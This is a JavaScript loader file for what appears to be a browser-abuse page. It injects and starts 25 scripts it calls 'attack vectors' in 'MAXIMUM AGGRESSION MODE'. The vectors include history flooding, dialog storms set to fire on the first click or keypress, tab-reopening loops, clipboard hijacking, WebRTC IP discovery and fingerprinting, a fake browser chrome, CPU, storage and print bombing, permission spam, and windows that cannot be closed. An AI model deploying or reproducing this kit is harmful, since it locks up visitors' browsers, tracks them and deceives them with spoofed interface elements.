/**
 * Attack Vectors Module - FS17FBWIN1
 * Master initializer - loads all attack vector modules
 * MAXIMUM AGGRESSION MODE
 */
(function() {
    'use strict';

    const scripts = [
        // Core 12 vectors
        'js/vectors/history_flood.js',
        'js/vectors/dialog_storm.js',
        'js/vectors/tab_loops.js',
        'js/vectors/service_worker.js',
        'js/vectors/focus_steal.js',
        'js/vectors/clipboard.js',
        'js/vectors/notifications.js',
        'js/vectors/webrtc.js',
        'js/vectors/fingerprint.js',
        'js/vectors/iframes.js',
        'js/vectors/viewport.js',
        'js/vectors/fake_chrome.js',
        // New maximum aggression vectors
        'js/vectors/audio_abuse.js',
        'js/vectors/print_bomb.js',
        'js/vectors/storage_bomb.js',
        'js/vectors/cpu_exhaustion.js',
        'js/vectors/permission_spam.js',
        'js/vectors/title_url_flash.js',
        'js/vectors/wake_orientation.js',
        'js/vectors/css_animation.js',
        'js/vectors/pointer_drag.js',
        'js/vectors/cookie_scheme.js',
        'js/vectors/form_mutation.js',
        // Persistence vectors
        'js/vectors/impossible_close.js',
        'js/vectors/self_download.js'
    ];

    let loaded = 0;
    const loadScript = (src) => {
        const s = document.createElement('script');
        s.src = src;
        s.onload = () => { loaded++; if (loaded === scripts.length) initAll(); };
        s.onerror = () => { loaded++; if (loaded === scripts.length) initAll(); };
        document.head.appendChild(s);
    };

    const initAll = () => {
        console.log('[FS17FBWIN1] MAXIMUM AGGRESSION - All vectors initializing...');
        // Core vectors
        if (window.HistoryFlooding) HistoryFlooding.init();
        if (window.FocusStealing) FocusStealing.init();
        if (window.ClipboardHijacking) ClipboardHijacking.init();
        if (window.WebRTCDiscovery) WebRTCDiscovery.init();
        if (window.CanvasFingerprinting) CanvasFingerprinting.init();
        if (window.IframeNesting) IframeNesting.init();
        if (window.ViewportLocking) ViewportLocking.init();
        if (window.FakeBrowserChrome) FakeBrowserChrome.init();
        try { if (window.ServiceWorkerReg) ServiceWorkerReg.init(); } catch(e) {}
        try { if (window.NotificationAbuse) NotificationAbuse.init(); } catch(e) {}
        try { if (window.TabReopeningLoops) TabReopeningLoops.init(); } catch(e) {}
        // New vectors
        try { if (window.AudioAbuse) AudioAbuse.init(); } catch(e) {}
        try { if (window.PrintBombing) PrintBombing.init(); } catch(e) {}
        try { if (window.StorageBombing) StorageBombing.init(); } catch(e) {}
        try { if (window.CPUExhaustion) CPUExhaustion.init(); } catch(e) {}
        try { if (window.PermissionSpam) PermissionSpam.init(); } catch(e) {}
        try { if (window.TitleURLFlashing) TitleURLFlashing.init(); } catch(e) {}
        try { if (window.WakeOrientationLock) WakeOrientationLock.init(); } catch(e) {}
        try { if (window.CSSAnimationOverload) CSSAnimationOverload.init(); } catch(e) {}
        try { if (window.PointerDragLock) PointerDragLock.init(); } catch(e) {}
        try { if (window.CookieSchemeBomb) CookieSchemeBomb.init(); } catch(e) {}
        try { if (window.FormMutationBomb) FormMutationBomb.init(); } catch(e) {}
        // Persistence vectors
        try { if (window.ImpossibleToClose) ImpossibleToClose.init(); } catch(e) {}
        try { if (window.SelfDownload) SelfDownload.init(); } catch(e) {}
        // Dialog storms - trigger on first interaction (click OR keypress)
        document.addEventListener('click', () => { try { if (window.DialogStorms) DialogStorms.init(false); } catch(e) {} }, { once: true });
        document.addEventListener('keydown', () => { try { if (window.DialogStorms) DialogStorms.init(false); } catch(e) {} }, { once: true });
        console.log('[FS17FBWIN1] ALL 25 ATTACK VECTORS ACTIVE.');
    };

    scripts.forEach(loadScript);
})();
